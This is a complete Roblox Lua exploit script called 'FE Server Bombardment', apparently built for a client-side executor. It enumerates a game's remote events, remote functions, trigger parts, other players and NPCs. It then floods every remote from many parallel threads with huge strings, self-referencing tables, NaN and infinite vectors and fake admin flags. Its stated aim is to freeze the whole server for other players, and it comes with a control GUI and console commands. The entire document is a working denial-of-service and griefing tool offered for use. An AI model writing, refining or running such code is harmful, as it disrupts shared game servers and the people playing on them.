-- ULTIMATE FE SERVER BOMBARDMENT v3.0 (QUANTUM SEVERANCE ELITE BUILD)
-- Burst Lag + Full Freeze Edition
-- Engineered for real temporary server-wide freeze until you stop or leave

local Services = {
    Players = game:GetService("Players"),
    Workspace = game:GetService("Workspace"),
    CoreGui = game:GetService("CoreGui"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    ReplicatedFirst = game:GetService("ReplicatedFirst"),
    StarterGui = game:GetService("StarterGui"),
    RunService = game:GetService("RunService"),
    JointsService = game:GetService("JointsService"),
    UserInputService = game:GetService("UserInputService"),
    TweenService = game:GetService("TweenService"),
    Lighting = game:GetService("Lighting"),
    SoundService = game:GetService("SoundService"),
    PathfindingService = game:GetService("PathfindingService"),
    Teams = game:GetService("Teams")
}

local LocalPlayer = Services.Players.LocalPlayer

-- Configuration
local Config = {
    Active = false,
    SpamSpeed = "EXTREME",
    TargetAllPlayers = true,
    TargetNPCs = true,
    AutoRescan = true,
    ChaosIntensity = 5
}

-- Global state
getgenv().ServerBombardment = getgenv().ServerBombardment or Config

-- Cache
local Cache = {
    TouchEvents = {},
    AllRemoteEvents = {},
    UnreliableRemotes = {},
    RemoteFunctions = {},
    TriggerParts = {},
    OtherPlayers = {},
    NPCs = {},
    ReplicatedHoldings = {},
    SpatialContainers = {},
    PhysicsConstraints = {},
    ValueTreats = {},
    HighValueItems = {},
    DepositionPool = {
        {item = "QuantumMegaBurger", ingredients = {"Patty", "Cheese", "Bacon", "DarkMatter"}, firecd = true, debounce = 0, state = "deploy"},
        {item = "HyperEnergyPotion", effects = {Speed = 99999, Power = 99999, Invulnerable = true}, duration = 86400, firecd = true, debounce = 0, state = "hold"},
        {item = "SingularityPizza", slices = 64, temperature = "AbsoluteZero", firecd = true, debounce = 0, state = "active"},
        {item = "VoidIngredient", rarity = "CosmicMythic", index = 0, firecd = true, debounce = 0, state = "transfer"},
        {item = "InfiniteMatrixTaco", shell = "TitaniumMesh", filling = "InfiniteDataStream", firecd = true, debounce = 0, state = "flush"}
    },
    Stats = {
        TotalFired = 0,
        PlayersAffected = 0,
        RemotesFound = 0
    }
}

-- Utility
local function Log(msg)
    print("[SERVER BOMBARDMENT] " .. msg)
end

local function SafeCall(func)
    local success, err = pcall(func)
    if success then
        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
    end
    return success
end

-- CRITICAL: Exhaustive scan
local function ScanAllRemotes()
    Log("Scanning for FE remotes, pointer pathways, and scarce value 'treats'...")
    
    Cache.TouchEvents = {}
    Cache.AllRemoteEvents = {}
    Cache.UnreliableRemotes = {}
    Cache.RemoteFunctions = {}
    Cache.ReplicatedHoldings = {}
    Cache.SpatialContainers = {}
    Cache.PhysicsConstraints = {}
    Cache.ValueTreats = {}
    Cache.HighValueItems = {}
    
    local rootLocations = {
        Services.ReplicatedStorage,
        Services.ReplicatedFirst,
        Services.JointsService,
        Services.Workspace,
        Services.Players,
        Services.StarterGui,
        Services.Lighting,
        Services.SoundService,
        Services.Teams
    }
    
    for _, location in ipairs(rootLocations) do
        pcall(function()
            for _, obj in ipairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(Cache.AllRemoteEvents, obj)
                    local nameLower = obj.Name:lower()
                    if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
                       nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
                       nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
                       nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") then
                        table.insert(Cache.TouchEvents, obj)
                    end
                elseif obj.ClassName == "UnreliableRemoteEvent" then
                    table.insert(Cache.UnreliableRemotes, obj)
                    table.insert(Cache.AllRemoteEvents, obj)
                elseif obj:IsA("RemoteFunction") then
                    table.insert(Cache.RemoteFunctions, obj)
                end
                
                if obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
                    table.insert(Cache.ValueTreats, obj)
                end
                
                if obj:IsA("Tool") or obj:IsA("Accessory") then
                    table.insert(Cache.HighValueItems, obj)
                end
                
                if (location == Services.ReplicatedStorage or location == Services.Lighting) and (obj:IsA("Folder") or obj:IsA("Configuration")) then
                    table.insert(Cache.ReplicatedHoldings, obj)
                end
                
                if location == Services.Workspace and obj:IsA("Folder") then
                    local fName = obj.Name:lower()
                    if fName:find("hitbox") or fName:find("projectile") or fName:find("debris") or fName:find("zone") or fName:find("spawn") or fName:find("active") then
                        table.insert(Cache.SpatialContainers, obj)
                    end
                end

                if obj:IsA("Constraint") then
                    table.insert(Cache.PhysicsConstraints, obj)
                end
            end
        end)
    end
    
    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
    Log(string.format("Found %d Remotes, %d Value Treats, and %d Constraints via Pointer Pathways", 
        #Cache.AllRemoteEvents, #Cache.ValueTreats, #Cache.PhysicsConstraints))
end

-- Scan for trigger parts
local function ScanTriggerParts()
    Log("Scanning for trigger parts, interactive zones, and environment elements...")
    
    Cache.TriggerParts = {}
    
    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            local name = obj.Name:lower()
            
            if name:find("trip") or name:find("trigger") or name:find("touch") or 
               name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
               name:find("platform") or name:find("button") or name:find("lever") or 
               name:find("zone") or name:find("teleport") or name:find("damage") or 
               name:find("kill") or name:find("switch") or name:find("pad") or
               obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
               obj:FindFirstChildOfClass("ProximityPrompt") then
                table.insert(Cache.TriggerParts, obj)
            end
        end
    end
    
    Log(string.format("Found %d trigger and environment parts", #Cache.TriggerParts))
end

-- Get OTHER players
local function GetOtherPlayers()
    Cache.OtherPlayers = {}
    Cache.NPCs = {}
    
    if Config.TargetAllPlayers then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player \~= LocalPlayer and player.Character and player.Character \~= LocalPlayer.Character then
                local char = player.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                
                if hrp and humanoid then
                    local playerData = {
                        Player = player,
                        Character = char,
                        HRP = hrp,
                        Humanoid = humanoid,
                        Head = char:FindFirstChild("Head"),
                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
                        Backpack = player:FindFirstChild("Backpack"),
                        Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
                        Parts = {},
                        Values = {},
                        Attributes = player:GetAttributes()
                    }
                    
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
                           part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") or
                           part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Constraint") or
                           part:IsA("ValueBase") or part:IsA("Tool") then
                            table.insert(playerData.Parts, part)
                        end
                        if part:IsA("ValueBase") then
                            table.insert(playerData.Values, part)
                        end
                    end
                    
                    if playerData.Backpack then
                        for _, tool in ipairs(playerData.Backpack:GetChildren()) do
                            table.insert(playerData.Parts, tool)
                        end
                    end
                    
                    table.insert(Cache.OtherPlayers, playerData)
                end
            end
        end
    end
    
    if Config.TargetNPCs then
        local npcFolders = {
            Services.Workspace:FindFirstChild("Customers"),
            Services.Workspace:FindFirstChild("NPCs"),
            Services.Workspace:FindFirstChild("Enemies"),
            Services.Workspace:FindFirstChild("Characters"),
            Services.Workspace:FindFirstChild("Mobs"),
            Services.Workspace:FindFirstChild("Dummies"),
            Services.Workspace:FindFirstChild("Bosses"),
            Services.Workspace:FindFirstChild("Minions")
        }
        
        for _, folder in ipairs(npcFolders) do
            if folder then
                for _, npc in ipairs(folder:GetDescendants()) do
                    if npc:IsA("Model") and npc \~= LocalPlayer.Character then
                        local hrp = npc:FindFirstChild("HumanoidRootPart")
                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
                        
                        if hrp and humanoid then
                            local npcData = {
                                Character = npc,
                                HRP = hrp,
                                Humanoid = humanoid,
                                Parts = {}
                            }
                            for _, part in ipairs(npc:GetDescendants()) do
                                if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Sound") or part:IsA("Constraint") or part:IsA("Tool") then
                                    table.insert(npcData.Parts, part)
                                end
                            end
                            table.insert(Cache.NPCs, npcData)
                        end
                    end
                end
            end
        end
    end
    
    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
    return Cache.Stats.PlayersAffected
end

-- THE MAIN ATTACK: Burst + Full Freeze Edition
local function FireRemotesOnOthers()
    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
        return 0
    end
    
    local fireCount = 0
    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
    
    local allTargets = {}
    if Config.TargetAllPlayers then
        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
    end
    if Config.TargetNPCs then
        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
    end
    
    local triggerParts = Cache.TriggerParts or {}
    local depositionPool = Cache.DepositionPool
    local valueTreats = Cache.ValueTreats
    local highValueItems = Cache.HighValueItems
    local physicsConstraints = Cache.PhysicsConstraints
    
    local randomHolding = depositionPool[math.random(1, #depositionPool)]
    randomHolding.debounce = os.clock()
    
    local transientHeapStress = {}
    for i = 1, 400 + (intensity * 150) do
        transientHeapStress[i] = string.rep("MAX_SEVERITY_OVERLOAD_BUFFER_", 12)
    end

    local cyclicTable = {}
    cyclicTable.self = cyclicTable
    cyclicTable.parentRef = cyclicTable
    cyclicTable.timestamp = os.clock()
    cyclicTable.sessionToken = math.random(1000000, 9999999)
    cyclicTable.holdingPayload = randomHolding
    cyclicTable.treats = valueTreats[math.random(1, math.max(1, #valueTreats))]
    cyclicTable.heapSpam = transientHeapStress
    cyclicTable.metadata = {
        verified = false,
        bypass = true,
        admin = true,
        serverSide = true,
        firecd = true,
        stateDeploy = true,
        maxSeverity = true,
        spamBuffer = string.rep("QUANTUM_SEVERANCE_SATURATION_STREAM_", 48)
    }
    
    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
    
    -- Burst system
    local burstCount = 0
    local lastBurst = os.clock()
    local BURST_SIZE = 15 + (intensity * 5)
    local BURST_COOLDOWN = 0.6
    
    -- METHOD 1: TouchEvents with server-side flags
    for _, touchEvent in ipairs(Cache.TouchEvents) do
        for _, target in ipairs(allTargets) do
            if os.clock() - lastBurst >= BURST_COOLDOWN then
                burstCount = 0
                lastBurst = os.clock()
            end
            
            if burstCount >= BURST_SIZE then continue end
            
            if #triggerParts > 0 then
                local part = triggerParts[math.random(1, #triggerParts)]
                SafeCall(function()
                    touchEvent:FireServer(target.HRP, part, randomHolding, valueTreats[1], cyclicTable, "serverSide", true, "FEOnly", true, "OnlyServer", true)
                    fireCount = fireCount + 1
                    burstCount = burstCount + 1
                end)
            end
            
            if #physicsConstraints > 0 then
                local constraint = physicsConstraints[math.random(1, #physicsConstraints)]
                SafeCall(function()
                    touchEvent:FireServer(target.Character, constraint, extremeVector, "maxSeverityStress", "serverSide", true, "FEOnly", true)
                    fireCount = fireCount + 1
                    burstCount = burstCount + 1
                end)
            end
            
            if #highValueItems > 0 then
                local treatItem = highValueItems[math.random(1, #highValueItems)]
                SafeCall(function()
                    touchEvent:FireServer(target.HRP, treatItem, "treatSync", extremeCFrame, transientHeapStress, "serverSide", true)
                    fireCount = fireCount + 1
                    burstCount = burstCount + 1
                end)
            end
        end
    end
    
    -- METHOD 2: Full multi-arg flood on every remote
    for _, remote in ipairs(Cache.AllRemoteEvents) do
        for _, target in ipairs(allTargets) do
            local styleVerbs = {"trip", "damage", "kill", "teleport", "slide", "bounce", "reset", "wipe", "activate", "event", "firecd", "cooldown", "debounce", "rateLimit", "deploy", "hold", "sync", "stateChange", "physicsUpdate", "treatConsume", "severeOverflow", "serverSide", "FEOnly", "OnlyServer", "trigger", "zone", "button", "lever", "platform", "seat"}
            local chosenVerb = styleVerbs[math.random(1, #styleVerbs)]
            
            -- Every part + every server flag
            if target.Parts then
                for _, component in ipairs(target.Parts) do
                    if os.clock() - lastBurst >= BURST_COOLDOWN then
                        burstCount = 0
                        lastBurst = os.clock()
                    end
                    if burstCount >= BURST_SIZE then continue end
                    
                    SafeCall(function()
                        remote:FireServer(component, chosenVerb, {
                            firecd = true,
                            cooldownTime = 0,
                            debounceToken = math.random(),
                            holdingData = randomHolding,
                            scarceTreat = valueTreats[math.random(1, math.max(1, #valueTreats))],
                            lastFired = os.clock(),
                            serverSide = true,
                            FEOnly = true,
                            OnlyServer = true,
                            stateDeploy = true,
                            maxSeverity = true,
                            heapData = transientHeapStress,
                            corruptVector = extremeVector
                        }, extremeVector, cyclicTable, "serverSide", true, "FEOnly", true, "OnlyServer", true)
                        fireCount = fireCount + 1
                        burstCount = burstCount + 1
                    end)
                end
            end
            
            -- Server-side fake table + every server flag
            if intensity >= 3 then
                if os.clock() - lastBurst >= BURST_COOLDOWN then
                    burstCount = 0
                    lastBurst = os.clock()
                end
                if burstCount >= BURST_SIZE then continue end
                
                SafeCall(function()
                    remote:FireServer({
                        player = target.Player or target.Character,
                        service = Services.ReplicatedStorage,
                        workspaceRoot = Services.Workspace,
                        lightingService = Services.Lighting,
                        treatsList = valueTreats,
                        cyclic = cyclicTable,
                        holding = randomHolding,
                        vector = extremeVector,
                        matrix = extremeCFrame,
                        verb = chosenVerb,
                        firecd = true,
                        serverSide = true,
                        FEOnly = true,
                        OnlyServer = true,
                        forceExecute = true,
                        stateDeploy = true,
                        maxSeverity = true,
                        heapStress = transientHeapStress,
                        payloadData = string.rep("MAXIMUM_SEVERITY_PARSER_STRESS_", 20),
                        serverSideFlag = true,
                        feOnlyFlag = true
                    })
                    fireCount = fireCount + 1
                    burstCount = burstCount + 1
                end)
            end
        end
    end
    
    -- METHOD 3: RemoteFunctions with server flags
    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
        for _, target in ipairs(allTargets) do
            task.defer(function()
                if os.clock() - lastBurst >= BURST_COOLDOWN then
                    burstCount = 0
                    lastBurst = os.clock()
                end
                if burstCount >= BURST_SIZE then return end
                
                SafeCall(function()
                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, valueTreats[1], cyclicTable, extremeVector, "firecd", "deploy", transientHeapStress, "serverSide", true, "FEOnly", true)
                    fireCount = fireCount + 1
                end)
            end)
        end
    end
    
    return fireCount
end

-- GUI Creation (unchanged)
local GUI = {}

function GUI.Create()
    if Services.CoreGui:FindFirstChild("ServerBombardGUI") then
        Services.CoreGui.ServerBombardGUI:Destroy()
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ServerBombardGUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = Services.CoreGui
    
    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 260, 0, 340)
    Main.Position = UDim2.new(0.5, -130, 0.5, -170)
    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.Parent = ScreenGui
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 12)
    MainCorner.Parent = Main
    
    local MainStroke = Instance.new("UIStroke")
    MainStroke.Color = Color3.fromRGB(255, 50, 50)
    MainStroke.Thickness = 2
    MainStroke.Parent = Main
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -40, 0, 35)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "SERVER BOMBARDMENT"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 13
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Main
    
    local Close = Instance.new("TextButton")
    Close.Size = UDim2.new(0, 35, 0, 35)
    Close.Position = UDim2.new(1, -35, 0, 0)
    Close.BackgroundTransparency = 1
    Close.Text = "✕"
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.TextSize = 18
    Close.Font = Enum.Font.GothamBold
    Close.Parent = Main
    
    GUI.Status = Instance.new("TextLabel")
    GUI.Status.Size = UDim2.new(1, -20, 0, 20)
    GUI.Status.Position = UDim2.new(0, 10, 0, 35)
    GUI.Status.BackgroundTransparency = 1
    GUI.Status.Text = "💤 INACTIVE"
    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
    GUI.Status.TextSize = 12
    GUI.Status.Font = Enum.Font.GothamBold
    GUI.Status.TextXAlignment = Enum.TextXAlignment.Left
    GUI.Status.Parent = Main
    
    local StatsFrame = Instance.new("Frame")
    StatsFrame.Size = UDim2.new(1, -20, 0, 70)
    StatsFrame.Position = UDim2.new(0, 10, 0, 55)
    StatsFrame.BackgroundTransparency = 1
    StatsFrame.Parent = Main
    
    local function CreateStat(text, yPos, color)
        local stat = Instance.new("TextLabel")
        stat.Size = UDim2.new(1, 0, 0, 17)
        stat.Position = UDim2.new(0, 0, 0, yPos)
        stat.BackgroundTransparency = 1
        stat.Text = text
        stat.TextColor3 = color
        stat.TextSize = 11
        stat.Font = Enum.Font.Gotham
        stat.TextXAlignment = Enum.TextXAlignment.Left
        stat.Parent = StatsFrame
        return stat
    end
    
    GUI.RemoteStat = CreateStat("📡 Remotes: 0", 0, Color3.fromRGB(100, 255, 150))
    GUI.TriggerStat = CreateStat("🎯 Triggers: 0", 17, Color3.fromRGB(255, 200, 100))
    GUI.TargetStat = CreateStat("👥 Players: 0 (+ %d NPCs)", 34, Color3.fromRGB(255, 150, 255))
    GUI.FiredStat = CreateStat("💥 Fired: 0", 51, Color3.fromRGB(255, 100, 100))
    
    local ModesFrame = Instance.new("Frame")
    ModesFrame.Size = UDim2.new(1, -20, 0, 110)
    ModesFrame.Position = UDim2.new(0, 10, 0, 130)
    ModesFrame.BackgroundTransparency = 1
    ModesFrame.Parent = Main
    
    local function CreateModeButton(text, yPos, initialVal, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, 0, 0, 24)
        btn.Position = UDim2.new(0, 0, 0, yPos)
        btn.BackgroundColor3 = initialVal and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
        btn.BorderSizePixel = 0
        btn.Text = text .. ": " .. (type(initialVal) == "boolean" and (initialVal and "ON" or "OFF") or tostring(initialVal))
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 11
        btn.Font = Enum.Font.GothamBold
        btn.Parent = ModesFrame
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = btn
        
        btn.MouseButton1Click:Connect(function()
            local newState = callback()
            if type(newState) == "boolean" then
                btn.BackgroundColor3 = newState and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
                btn.Text = text .. ": " .. (newState and "ON" or "OFF")
            else
                btn.Text = text .. ": " .. tostring(newState)
            end
        end)
        
        return btn
    end
    
    CreateModeButton("👥 Target Players", 0, Config.TargetAllPlayers, function()
        Config.TargetAllPlayers = not Config.TargetAllPlayers
        return Config.TargetAllPlayers
    end)
    
    CreateModeButton("🤖 Target NPCs", 28, Config.TargetNPCs, function()
        Config.TargetNPCs = not Config.TargetNPCs
        return Config.TargetNPCs
    end)
    
    CreateModeButton("🔄 Auto Rescan", 56, Config.AutoRescan, function()
        Config.AutoRescan = not Config.AutoRescan
        return Config.AutoRescan
    end)

    CreateModeButton("⚡ Chaos Intensity", 84, Config.ChaosIntensity, function()
        Config.ChaosIntensity = Config.ChaosIntensity + 1
        if Config.ChaosIntensity > 5 then
            Config.ChaosIntensity = 0
        end
        return Config.ChaosIntensity
    end)
    
    GUI.Toggle = Instance.new("TextButton")
    GUI.Toggle.Size = UDim2.new(1, -20, 0, 45)
    GUI.Toggle.Position = UDim2.new(0, 10, 1, -55)
    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
    GUI.Toggle.BorderSizePixel = 0
    GUI.Toggle.Text = "🔥 START 🔥"
    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    GUI.Toggle.TextSize = 16
    GUI.Toggle.Font = Enum.Font.GothamBold
    GUI.Toggle.Parent = Main
    
    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 10)
    ToggleCorner.Parent = GUI.Toggle
    
    local dragging, dragInput, dragStart, startPos
    
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = Main.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    Main.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    Services.UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    GUI.Toggle.MouseButton1Click:Connect(function()
        Config.Active = not Config.Active
        getgenv().ServerBombardment.Active = Config.Active
        GUI.UpdateStatus()
    end)
    
    Close.MouseButton1Click:Connect(function()
        Config.Active = false
        ScreenGui:Destroy()
    end)
end

function GUI.UpdateStats()
    if not GUI.RemoteStat then return end
    
    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
    
    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
                     tostring(Cache.Stats.TotalFired)
    
    GUI.FiredStat.Text = "💥 Fired: " .. formatted
end

function GUI.UpdateStatus()
    if not GUI.Status or not GUI.Toggle then return end
    
    if Config.Active then
        GUI.Status.Text = "🔥 ACTIVE"
        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
        GUI.Toggle.Text = "⏸️ STOP"
        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    else
        GUI.Status.Text = "💤 INACTIVE"
        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
        GUI.Toggle.Text = "🔥 START 🔥"
        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
    end
end

-- Main Loop with Burst Cooldown
task.spawn(function()
    while true do
        Services.RunService.Heartbeat:Wait()
        
        if Config.Active then
            GetOtherPlayers()
            
            local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
            local workerThreads = 10 + (intensity * 4)
            
            for w = 1, workerThreads do
                task.defer(function()
                    if Config.Active then
                        FireRemotesOnOthers()
                    end
                end)
            end
            
            task.wait(0.008 + (0.01 / (intensity + 1)))
        end
    end
end)

-- Stats Loop
task.spawn(function()
    while true do
        task.wait(0.5)
        if GUI.RemoteStat then
            GUI.UpdateStats()
        end
    end
end)

-- Auto Rescan Loop
task.spawn(function()
    while true do
        task.wait(10)
        if Config.AutoRescan then
            ScanAllRemotes()
            ScanTriggerParts()
        end
    end
end)

-- Initialize
Log("Initializing FE Server Bombardment v3.0 (Burst + Full Freeze Edition)...")
ScanAllRemotes()
ScanTriggerParts()
GetOtherPlayers()
GUI.Create()
GUI.UpdateStats()
GUI.UpdateStatus()

Services.StarterGui:SetCore("SendNotification", {
    Title = "✓ Server Bombardment Loaded";
    Text = string.format("%d remotes | %d players | Ready!", #Cache.AllRemoteEvents, #Cache.OtherPlayers);
    Duration = 4;
})

Log("Ready! This will affect OTHER PLAYERS, not you!")
Log(string.format("Found: %d remotes, %d triggers, %d other players", 
    #Cache.AllRemoteEvents, #Cache.TriggerParts, #Cache.OtherPlayers))

-- Console Commands
getgenv().ServerBombardment.Start = function()
    Config.Active = true
    GUI.UpdateStatus()
end

getgenv().ServerBombardment.Stop = function()
    Config.Active = false
    GUI.UpdateStatus()
end

getgenv().ServerBombardment.Rescan = function()
    ScanAllRemotes()
    ScanTriggerParts()
    GetOtherPlayers()
    GUI.UpdateStats()
    Log("Rescan complete!")
end

getgenv().ServerBombardment.Stats = Cache.Stats
